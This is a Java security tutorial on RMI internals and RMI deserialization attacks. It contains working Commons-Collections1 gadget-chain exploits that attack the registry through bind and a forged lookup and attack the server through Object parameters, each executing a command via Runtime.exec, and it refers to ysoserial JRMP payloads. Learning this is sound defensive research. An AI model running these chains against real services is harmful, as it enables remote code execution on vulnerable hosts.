# Java Security Learning—RMI Learning

Author: H3rmesk1t

Data: 2022.01.19

# Introduction to RMI
RMI: Remote Method Invocation, as the name implies, is a kind of idea of ​​calling objects in remote locations to execute methods, and is a technology to implement method calls across `JVM`

The idea was reflected in the `RPC "Remote Procedure Calls" in the `C language, but `RPC "packages and transmits data structures. In `Java`, a complete object is usually passed, which contains both data and methods for operating data. If you want to completely transmit an object to a remote location in the network, the method commonly used is `Java` native deserialization, and a `Java` class can be safely transmitted in combination with dynamic class loading and security managers. The specific implementation idea is to obtain a reference to an object on the remote host and call this reference object, but the actual method is executed at a remote location.

Two concepts are introduced in `RMI` to solve the complexity of network communication, namely `Stubs` (client stubs) and `Skeletons` (server skeletons). When the client tries to call an object on the remote side, it actually calls a proxy class (Stub) local to the client. Before calling the target class on the remote side, it will also enter a corresponding remote proxy class (Skeletons) that accepts remote methods from the proxy class on the client and passes them to the real target class.

![RMI call timing chart](./images/1.png)

When using `RMI`, you must first define an interface that can be called remotely. The interface must extend the `java.rmi.Remote` interface, and the object used to call remotely is an instance of the interface. At the same time, all methods in this interface must declare that throwing the `java.rmi.RemoteException` exception. The example code is as follows:

```java
public interface RemoteInterface extends Remote {
    
    public String demoCaseBegin() throws RemoteException;

    public String demoCaseBegin(Object demo) throws RemoteException;

    public String demoCaseOver() throws RemoteException;
}
```

Secondly, create the implementation class of this remote interface. This class is the real execution logic code, and it usually extends the `java.rmi.server.UnicastRemoteObject` class. After extending this class, RMI will automatically export this class to the Client side that wants to call it. It also provides some basic `equals/hashcode/toString` method. Here, a constructor must be provided for this implementation class and throws a `RemoteException`.

When `export`, a port will be randomly bound to listen to client requests, so even if you do not register, you can communicate directly by requesting this port.

If you do not want the remote object to be a subclass of `UnicastRemoteObject`, you need to actively use its static method `exportObject` to manually export` object. The example code is as follows:

```java
public class RemoteObject extends UnicastRemoteObject implements RemoteInterface {
    
    protected RemoteObject() throws RemoteException {
    }

    @Override
    public String demoCaseBegin() throws RemoteException {
        return "Hello World!";
    }

    @Override
    public String demoCaseBegin(Object demo) throws RemoteException {
        return demo.getClass().getName();
    }

    @Override
    public String demoCaseOver() throws RemoteException {
        return "Bye!";
    }
}
```

When the remote call object is created, use the registry idea designed by `RMI` to find a reference to a remote object. In layman's terms, this is like a telephone book. When we need to obtain information from someone (Remote Method Invocation), we first find the person's phone number through the name of the person (Name) on the phone book (Registry), and find the person (Remote Object) through this number. This `phone book idea is based on `java.rmi.registry.Registry` and `java.rmi.Naming`.

`java.rmi.Naming` is a `final` class that provides methods to store and obtain remote object references in the remote object registry. Each method provided by this class has a parameter in the `URL` format (//host:port/name)
 - host: The host where the registry is located
 - port: The port number that the registry accepts call, default is 1099
 - name: The name of the reference to register `Remote Object` cannot be some keywords in the registry

![Naming class](./images/2.png)

`Naming` is a class used to operate on the registry. In `Naming`, `lookup` (query), `bind` (binding), `rebind` (rebinding), `unbind` (unbind), `list` (list) and other methods are provided in `Naming` to perform corresponding operations on the registry. The specific implementation method of these methods is to call the `LocateRegistry.getRegistry` method to obtain the implementation class of the `Registry` interface and call its related methods for implementation.

The `java.rmi.registry.Registry` interface has two implementation classes under `RMI`, namely `RegistryImpl` and `RegistryImpl_Stub`.

In practical applications, we usually use the `LocateRegistry#createRegistry()` method to create a registry. The sample code is as follows:

```java
public class Registry {

    public static void main(String args[]) {
        try {
            LocateRegistry.createRegistry(1099);
            System.out.println("Server Start!");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

Then bind the class we need to call, the sample code is as follows:

```java
public class RemoteServer {

    public static void main(String args[]) throws RemoteException, MalformedURLEXception, AlreadyBoundException, InterruptedException {
        // Create remote object
        RemoteInterface remoteObject = new RemoteObject();
        // Binding class
        Naming.bind("rmi://127.0.0.1:1099/Demo", remoteObject);
    }
}
```

Then make a call on the client.

```java
public class RMIClient {

    public static void main(String args[]) throws RemoteException, NotBoundException {
        // sum.rmi.registry.RegistryImpl_Stub
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);

        System.out.println(Arrays.toString(registry.list()));

        // lookup && call
        RemoteInterface stub = (RemoteInterface) registry.lookup("Demo");
        System.out.println(stub.demoCaseBegin());
        System.out.println(stub,demoCaseOver());
    }
}
```

It should be noted that the RemoteInterface interface should exist in both Client`/`Server`/`Registry`, but `Server` and `Registry` are usually on the same end.

![RMI Simple Communication](./images/3.p
ng)

![RMI Simple Communication Flowchart](./images/4.png)

In the above figure, a remote call communication is simply implemented. Here are a few more features:
 - Dynamic loading class: If the client passes a serializable object when calling, but this object does not exist on the server, the server will throw an exception of `ClassNotFound`, but `RMI` supports dynamic class loading. Therefore, when `java.rmi.server.codebase` is set, it will try to get `.class` from the address and load and deserialize it. You can set it using `System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:9999/"); `, or specify it using the startup parameter `-Djava.rmi.server.codebase="http://127.0.0.1:9999/"`.
 - Security Policy Settings: Since external classes are loaded through the network and methods are executed, there must be a security manager for management; if security management is not set, `RMI` will not dynamically load any classes. You can also use `-Djava.security.policy=rmi.policy` or `System.setProperty("java.security.policy", RemoteServer.class.getClassLoader().getResource("rmi.policy").toString());` to set it.

# Source code analysis
## Local Retrieval Registration Center
There are two ways to obtain the registration center. The first is to obtain it when creating, that is, `LocateRegistry#createRegistry`. There are two methods in `createRegistry`

![createRegistry method](./images/5.png)

The first method only needs to pass the port monitored by the registry center - `port`. In addition to passing the port monitored by the registry center, the other method also needs to pass the `RMIClientSocketFactory` and `RMIServerSocketFactory` objects. The two methods finally get the `RegistryImpl` object. Since the difference between the two methods is not big, only the first method is analyzed here.

Follow up on `RegistryImpl`, which first determines whether the incoming `var1`, that is, whether the incoming `port` value is the default port `1099`, and checks whether the security policy is enabled. Some information is encapsulated in `LiveRef`, including the `IP` address, the port number that needs to be listened to, etc. Then call the `setup` method to pass the `UnicastServerRef` object in

![RegistryImpl method](./images/6.png)

In the process of `new UnicastServerRef`, pass the `LiveRef` object in and perform some data encapsulation operations.

![UnicastServerRef method](./images/7.png)

![RegistryImpl#setup method](./images/8.png)

Follow in `UnicastServerRef#exportObject`, first get the class passed to the object `var1`, then call the `Util#createProxy` method, and pass in the values ​​of `class sun.rmi.registry.RegistryImpl`, `Ref` and `forceStubUse` (whether there exists a class ending with `_Stub`, that is, `remoteClass + "_Stub"`, `forceStubUse` indicates whether an exception is thrown when it does not exist. Here is the value `false` set in the `UnicastServerRef` method .

![UnicastServerRef#exportObject method](./images/9.png)

![Util#createProxy method](./images/10.png)

Then follow the `createStub` method, here returns the `RegistryImpl_Stub` object

![createStub method](./images/11.png)

Then go back to the previous call to the `setSkeleton` method, here is the same method as obtaining the `RegistryImpl_Stub` object to obtain the `RegistryImpl_Skel` object.

![Util#setSkeleton method](./images/12.png)

![Util#createSkeleton method](./images/13.png)

When creating the Stub and Skel objects, a Target object will be instantiated, and some information will be initialized in `var6`. The Stub, Skel objects and some IP port information obtained above are encapsulated in an object. After that, `LiveRef#exportObject` will be called, and the Target object will be passed in. After passing multiple `exportObject`, a series of network layer operations will be performed (listening to ports, etc.).

![Target object](./images/14.png)

![exportObject object call chain](./images/15.png)

Following the TCPTransport#listen method, port listening will be enabled when TCPEndpoint#newServerSocket` is called.

![TCPTransport#exportObject](./images/16.png)

![listen listen](./images/17.png)

The `AcceptLoop` thread will then be set and its `run` method will be triggered.

![AcceptLoop method](./images/18.png)

Follow TCPTransport#executeAcceptLoop, here you will get some relevant information about the request, such as `Host`, and then create a thread below to call `ConnectionHandler` to handle the request.

![executeAcceptLoop method](./images/19.png)

Follow in `ConnectionHandler#run`, the `var2` here is the `ServerSocket` object passed in above, and then follow in the `run0` method.

![ConnectionHandler#run method](./images/20.png)

Follow `ConnectionHandler#run0`, and you will get some information sent by the client above. Below you will call `TCPTransport#handleMessages` to handle the request.

![ConnectionHandler#run0 method](./images/21.png)

Follow TCPTransport#handleMessages, you only need to pay attention to `80` here, because when the client sends data, the `80` is sent here. In the above code, a `StreamRemoteCall` object is first created and `var1` (the current connection `Connection` object).

![TCPTransport#handleMessages method](./images/22.png)

Follow TCPTransport#serviceCall, get some information coming from above, such as `ObjID`, and then get the `Target` object, and call `UnicastServerRef#dispatch` below to process the request.

![TCPTransport#serviceCall method](./images/23.png)

Follow the `UnicastServerRef#dispatch` method, two parameters are passed here, the `Remote` object and the currently connected `StreamRemoteCall` object. It is also read some data in the first place, and then the `UnicastServerRef#oldDispatch` will be called.

![UnicastServerRef#dispatch method](./images/24.png)

Following the `UnicastServerRef#oldDispatch`, the `this.skel.dispatch` method is called at the end of `try-catch`. At this time, the `this.skel` is the `RegistryImpl_Skel` object that just created.

![UnicastServerRef#oldDispatch method](./images/25.png)

Follow the `this.skel.dispatch` method and enter the core of the real processing of the request. There is the following corresponding relationship:
 - 0 -> bind
 - 1 -> list
 - 2 -> lookup
 - 3 -> rebind
 - 4 -> unbind

Here, each called method will be processed, for example, calling the `lookup` method will first deserialize the passed serialized object, and then call `var6.lookup` to register the service. At this time, `var6` is a `RegistryImpl` object. This object is actually obtained by calling `createRegistry`. Whether it is the client or the server, the method of calling the registration center is called by calling the created `RegistryImpl` object.

![skel.dispatch method](./images/26.png)

## Remote Access Registration Center
Another way to get the registry is to remotely obtain, that is, `LocateRegistry#getRegistry`. The object obtained through the `getRegistry` method is the `RegistryImpl_Stub` object. Unlike the object obtained through the `createRegistry`, the pseudo`RegistryImpl` object obtained by `createRegistry`.

Previous analysis steps
The steps are similar to `LocateRegistry#createRegistry`. Here we analyze the method when the request core is actually processed. Take `bind` as an example. Let's first look at the method of calling `bind` in the registration center obtained through `createRegistry`. First, the checkAccess method will be called for judgment, and the current permissions, source `IP` will be judged. One thing to note here is that address registration services other than `localhost` are not allowed in the higher version of `JDK, and this situation will also be judged here. Then check whether this key has been bound. If it has been bound, an error of `AlreadyBoundException` is thrown; otherwise, both the key and the object are put into `Hashtable`.

![bind method](./images/27.png)

![checkAccess method](./images/28.png)

Next, take a look at the `LocateRegistry#getRegistry` remotely call the `bind` method, first remotely obtain the registry center through `getRegistry`. At this time, the object obtained is `RegistryImpl_Stub`, then follow its `bind` method, and first call the `UnicastRef#newCall` method.

![RegistryImpl_Stub#bind method](./images/29.png)

Follow up on `UnicastRef#newCall`, the incoming `var3` here is the number for the previous five methods. `0` is the `bind` method. In the `newConnection` method, some agreed data will be written, such as `IP`, port, etc., and then `StreamRemoteCall`

![newCall method](./images/30.png)

![newConnection method](./images/31.png)

Follow `StreamRemoteCall`, and `80` was written here at the beginning, which also explains why only `80` was analyzed in `TCPTransport#handleMessages`, and then some data will be written, such as `num` and `ObjID` corresponding to the method to be called.

![StreamRemoteCall method](./images/32.png)

When the call is completed, return to the `bind` method, two contents will be written
 - Serialized `var1`: The name corresponding to the remote object to be bound
 - Serialized `var2`: Remote object to be bound

Then call the `invoke` method to send the request out. After receiving this request, the registry center will call `Skel#dispatch` to process it.

![bind serialization operation](./images/33.png)

Following up with `Skel#dispatch`, the registration center will first read two `Objects`, the first is the string object that just entered `write`, and the second is the remote object. Then call `var6.bind` to bind the service, that is, the `RegistryImpl` object.

![Skel#dispatch method](./images/34.png)

## Communication between Client and Server
It should be noted that the communication between the client and the server only occurs when the remote method is called, and the remote proxy object of the client communicates with the `Skel`.

The client obtains the proxy object encapsulated in the registration center, so the `invoke` method of the proxy object is called by default. Here we will determine whether the method called is owned by all objects or only those that are only available in remote objects. If it is the former, it will enter the `invokeObjectMethod` and the latter will enter the `invokeRemoteMethod`.

![RemoteObjectInvocationHandler#invoke method](./images/35.png)

Follow the `RemoteObjectInvocationHandle#invokeRemoteMethod`, here `ref.invoke` will be called and the `proxy`, `method`, `args` and `method` hash` is passed.

![RemoteObjectInvocationHandle#invokeRemoteMethod method](./images/36.png)

Following the UnicastRef#invoke, as before, in `newConnection`, some agreed data will be sent, and then the `marshaValue` method is called.

![UnicastRef#invoke method](images/37.png)

Follow the `marshaValue` method, in `marshaValue`, serialize the parameters to be passed by the called method to be serialized and written to the connection. If the passed parameter is an object, the serialized object will be written here, and then go back to `UnicastRef#invoke` to call `StreamRemoteCall#executeCall`.

![marshaValue method](./images/38.png)

Follow up on `StreamRemoteCall#executeCall`, and then call the `releaseOutputStream` method. When `this.out.flush`, the data written in before will be sent out, and the server will return the execution result.

![StreamRemoteCall#executeCall method](./images/39.png)

![releaseOutputStream method](./images/40.png)

![wireshark data](./images/41.png)

After calling `StreamRemoteCall#executeCall`, the `unmarsharValue` method will be called to retrieve the data.

![get data](./images/42.png)

![unmarsharValue method](./images/43.png)

When `Client` is communicating with `Server`, the actual location of `Server` to process the request is in `UnicastServerRef#dispatch`, here the `unmarshaValue` method will be called to process the parameters sent by the request. Here the data type of the parameter is judged. If it is `Object`, it will be deserialized. Therefore, if you can find that the parameter type passed by a method in the remote object registered by `Server` is `Object`, it will be deserialized on the server. At this time, `RCE` can be implemented (provided that it has `gadget`). Finally, the method of the remote object is called by calling `invoke`.

![UnicastServerRef#dispatch method](./images/44.png)

![unmarsharValue method](./images/43.png)

## Summarize
Use a picture to illustrate what steps have been gone through to perform a complete service registration, discovery, and call process.

![Flowchart](./images/45.png)

The underlying communication of `RMI` uses the `Stub` (running on the client) and `Skeleton` (running on the server) mechanisms. The `RMI` calls remote methods roughly as follows:
 - The `RMI` client will first create `Stub` when calling a remote method (sun.rmi.registry.RegistryImpl_Stub)
 - Stub will pass the `Remote` object to the remote reference layer (java.rmi.server.RemoteRef), and create the `java.rmi.server.RemoteCall` (remote call) object
 - RemoteCall`Serializes `RMI` service name, `Remote` object
 - Remote reference layer of the `RMI` client transmits the serialized request information of the `RemoteCall` request information is transmitted to the remote reference layer of the `RMI` server through the `Socket` connection
 - Remote reference layer of the `RMI` server side (sun.rmi.server.UnicastServerRef) will pass the request to `Skeleton`(sun.rmi.registry.RegistryImpl_Skel#dispatch)
 - `Skeleton` calls `RemoteCall` to deserialize the serialization passed by the `RMI` client
 - `Skeleton` handles client requests: `bind`, `list`, `lookup`, `rebind`, `unbind`, if it is `lookup`, then look up the interface object bound to the `RMI` service name, serialize the object and transfer it to the client through `RemoteCall`
 - `RMI` client deserializes server-side results, obtains references to remote objects
 - `RMI` client calls remote method, `RMI` server reflects the corresponding method of the `RMI` service implementation class and serializes the execution result and returns it to the client
 - `RMI` client deserializes `RMI` remote method call result

# RMI deserialization attack method
In the above analysis, it is not difficult to see that the `RMI` communication process is based on serialization, so there will naturally be deserialization, so you only need to select the attack method based on the deserialization point.

## Attack Registration Center
When the registration center handles the five methods of `bind`, `list`, `lookup`, `rebind`, and `unbind`, it can be used.

### list
When `list` is called, `readObject` does not exist, so the registry cannot be attacked.
```java
case 1:
    var2.releaseInputStream();
    String[] var97 = var6.list();

    try {
        ObjectOutput var98 = var2.getResultStream(true);
        var98.writeObject(var97);
        break;
} catch (IOException var92) {
        throw new MarshalException("error marshalling return", var92);
    }
```


### bind & rebind
When `bind` is called, the parameter name and remote object will be read with `readObject`. At this time, this method can be used to attack the registry center.
```java
case 0:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var94) {
        throw new UnmarshalException("error unmarshalling arguments", var94);
    } catch (ClassNotFoundException var95) {
        throw new UnmarshalException("error unmarshalling arguments", var95);
    } finally {
        var2.releaseInputStream();
    }

    var6.bind(var7, var8);
```

When `rebind` is called, `readObject` will also be used to read out the parameter name and remote object. Therefore, like `bind`, this method can be used to attack the registry center.
```java
case 3:
    try {
        var11 = var2.getInputStream();
        var7 = (String)var11.readObject();
        var8 = (Remote)var11.readObject();
    } catch (IOException var85) {
        throw new UnmarshalException("error unmarshalling arguments", var85);
    } catch (ClassNotFoundException var86) {
        throw new UnmarshalException("error unmarshalling arguments", var86);
    } finally {
        var2.releaseInputStream();
    }

    var6.rebind(var7, var8);
```

`Demo` code
```java
package org.h3rmesk1t.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 1:42 am
 */
public class RMIClientAttackDemo1 {
    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLEXception, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, AlreadyBoundException {

        // Commons-Collection1 chain
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        Map hashMap = new HashMap();
        hashMap.put("value", "d1no");
        Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);

        // Convert proxy object to Remote object
        Remote r = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, invocationHandler);

        // Get remote object instance
        Registry registry = LocateRegistry.getRegistry("localhost", 3333);
        registry.bind("demoCaseBegin", r);
    }
}
```

![Demo1 result](./images/46.png)

### unbind & lookup
`unbind` will call `readObject` to read the passed parameters, so it can be used.
```java
case 4:
    try {
var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var81) {
        throw new UnmarshalException("error unmarshalling arguments", var81);
    } catch (ClassNotFoundException var82) {
        throw new UnmarshalException("error unmarshalling arguments", var82);
    } finally {
        var2.releaseInputStream();
    }

    var6.unbind(var7);
```

`lookup` will also call `readObject` to read the passed parameters, so it can also be used.
```java
case 2:
    try {
        var10 = var2.getInputStream();
        var7 = (String)var10.readObject();
    } catch (IOException var89) {
        throw new UnmarshalException("error unmarshalling arguments", var89);
    } catch (ClassNotFoundException var90) {
        throw new UnmarshalException("error unmarshalling arguments", var90);
    } finally {
        var2.releaseInputStream();
    }

    var8 = var6.lookup(var7);
```

`Demo` code. When `unbind` or `lookup` is called, only strings are allowed to be passed, so malicious objects cannot be passed. There are several ways to solve this problem:
 - Forged connection request
 - `rasp hook` request code, modify send data

```java
package org.h3rmesk1t.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import sun.rmi.server.UnicastRef;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;
import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;


/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 1:42 am
 */
public class RMIClientAttackDemo2 {
    public static void main(String[] args) throws Exception {

        // Commons-Collection1 chain
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        Map hashMap = new HashMap();
        hashMap.put("value", "d1no");
        Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);

        // Convert proxy object to Remote object
        Remote r = (Remote) Proxy.newProxyInstance(
                Remote.class.getClassLoader(),
                new Class[]{Remote.class}, invocationHandler);

        // Get remote object instance
        Registry registry = LocateRegistry.getRegistry("localhost", 3333);

        // Get ref
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();
        fields_0[0].setAccessible(true);
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);

        //Get operations

        Field[] fields_1 = registry.getClass().getDeclaredFields();
        fields_1[0].setAccessible(true);
        Operation[] operations = (Operation[]) fields_1[0].get(registry);


        // Forge the lookup code to prevent the transmission of information
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
        O
bjectOutput var3 = var2.getOutputStream();
        var3.writeObject(r);
        ref.invoke(var2);
    }
}
```

![Demo2 result](./images/47.png)

## Attack the client
### Registration Center Attack Client
During the communication process, `RMI` interacts with the registry and the server. We can tamper with these two to achieve the purpose of attacking the client. For the registry, it is still triggered from the previous five methods:
 - bind
 - unbind
 - rebind
 - list
 - lookup

In each of the above methods, except for `unbind` and `rebind`, others will return data to the client. At this time, the data is serialized data, so the client will naturally deserialize it. Then you only need to forge the return data from the registration center to achieve the effect of attacking the client.

This attack method can use the `ysoserial``JRMPListener` attack module

### Server attacks the client
In `RMI`, the remote call method is passed back not necessarily a basic data type (String, int), but may also be an object. When the server returns an object to the client, the client must deserialize it accordingly. Therefore, we need to forge a server. When the client calls a remote method, the returned parameters are the malicious object we have constructed.

`Demo` code.

```java
package org.h3rmesk1t.rmi;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;


/**
 * @Author: H3rmesk1t
 * @Data: 2022/1/30 1:42 am
 */
public class RMIClientAttackDemo3 {
    public static void main(String[] args) throws Exception {

        // Get remote object instance
        Registry registry = LocateRegistry.getRegistry("localhost", 4321);

        RemoteInterface stub = (RemoteInterface) registry.lookup("demoCaseBegin");
        System.out.println(stub.demoCaseBegin(openCalculatorObject()));
    }

    public static Object openCalculatorObject() throws Exception {
        // Commons-Collection1 chain
        Transformer[] transformer = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
        Map hashMap = new HashMap();
        hashMap.put("value", "d1no");
        Map transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> h3rmesk1t = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = h3rmesk1t.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, transformedMap);

        return (Object) invocationHandler;
    }
}
```

### Remote loading object
When the object returned by a method on the server is not available to the client, the client can specify a `URL`, and the object will be instantiated through the `URL`. [Reference Article](https://paper.seebug.org/1091/#serverrmi-server)

## Attack the server
Refer to the attack method of attacking clients above.

## Bring echo attack
A retouch attack refers to when attacking the registry center. When an exception is encountered, the registry center will directly send the exception back and return it to the client. Previously, when attacking the registry center, you can attack the registry through `bind`, `lookup`, `unbind`, `rebind`, etc. When trying to attack, the command is indeed executed, but the errors in the registry center will also be passed to the client.

[Reference article](https://xz.aliyun.com/t/2223)

# Deserialize Gadgets
## UnicastRemoteObject
The deserialization call chain is:

```java
UnicastRemoteObject.readObject()
    UnicastRemoteObject.reexport()
        UnicastRemoteObject.exportObject()
            UnicastServerRef.exportObject()
                LiveRef.exportObject()
                    TCPEndpoint.exportObject()
                        TCPTransport.exportObject()
                            TCPTransport.listen()
```
The corresponding part of the above is the `gadget` of `ysoserial.payloads.JRMPListener`, which can be used in combination with `ysoserial.exploit.JRMPListener`.

## UnicastRef
The deserialization call chain is:

```java
UnicastRemoteObject.readObject()
    UnicastRemoteObject.reexport()
        UnicastRemoteObject.exportObject()
            UnicastServerRef.exportObject()
                LiveRef.exportObject()
                    TCPEndpoint.exportObject()
TCPTransport.exportObject()
                            TCPTransport.listen()
```
The malicious server can be used in conjunction with `ysoserial.exploit.JRMPListener`.

## RemoteObject
The `readObject` method of `RemoteObject` will first deserialize the member variable `RemoteRef ref`, and finally call its `readExternal` method, which can be used to trigger the previous `UnicastRef` chain.

```java
public class RemoteObject1 {

	public static void main(String[] args) throws Exception {

		String host = "127.0.0.1";
		int port = 12233;

		ObjID id = new ObjID(new Random().nextInt()); // RMI registry
		TCPEndpoint te = new TCPEndpoint(host, port);
		UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));

		RMIServerImpl_Stub stub = new RMIServerImpl_Stub(ref);

		// Use RemoteObjectInvocationHandler in ysoserial
// RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
// Registry proxy = (Registry) Proxy.newProxyInstance(RemoteObject1.class.getClassLoader(), new Class[]{Registry.class}, obj);

		SerializeUtil.writeObjectToFile(stub);
		SerializeUtil.readFileObject();
	}
}
```

`ysoserial` uses the proxy class of `RemoteObjectInvocationHandler` as the entry point for deserialization, which is equivalent to an extension chain of `UnicastRef`. This part corresponds to the `ysoserial.payloads.JRMPClient` gadget. The malicious server can use it in combination with `ysoserial.exploit.JRMPListener`.

# refer to
- [Java RMI attack from shallow to deep](https://su18.org/post/rmi-attack/)

- [Java Security-RMI-Learning Summary](https://paper.seebug.org/1251/#java-rmi-)